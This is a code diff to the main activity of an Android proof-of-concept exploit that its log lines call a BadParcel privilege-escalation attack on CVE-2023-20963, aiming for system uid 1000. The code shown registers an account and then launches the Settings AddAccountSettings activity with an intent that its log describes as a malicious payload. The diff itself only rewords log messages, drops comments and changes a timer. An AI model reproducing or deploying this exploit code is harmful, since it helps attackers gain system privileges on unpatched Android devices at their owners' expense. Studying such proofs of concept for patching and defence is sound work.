@@ -28,18 +28,16 @@ public class MainActivity extends Activity {
         setContentView(R.layout.activity_main);
 
         appendLog("[*] BadParcel + SecureUI PoC started.");
-        appendLog("[*] Attempting to escalate to uid=1000 via CVE-2023-20963...");
+        appendLog("[*] Triggering CVE-2023-20963...");
 
-        // 1. 強制的に認証サービスを登録（一度呼び出す）
         try {
             AccountManager am = (AccountManager) getSystemService(Context.ACCOUNT_SERVICE);
             am.addAccount("com.example.tzpoc", null, null, null, this, null, null);
-            appendLog("[+] addAccount triggered (may already exist).");
+            appendLog("[+] addAccount triggered.");
         } catch (Exception e) {
             appendLog("[+] addAccount triggered: " + e.getMessage());
         }
 
-        // 2. AddAccountSettings を起動
         Intent attacker = new Intent();
         attacker.setComponent(new ComponentName(
                 "com.android.settings",
@@ -52,12 +50,11 @@ public class MainActivity extends Activity {
         startActivity(attacker);
         appendLog("[+] AddAccountSettings launched with malicious payload.");
 
-        // 3. 10秒後に終了
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            appendLog("[*] PoC finished. Check logcat and /sdcard/Download/ for proof.");
+            appendLog("[*] PoC finished. Check /sdcard/Download/ for proof.");
             saveLog();
             finish();
-        }, 10000);
+        }, 15000);
     }
 
     public static void appendLog(String msg) {
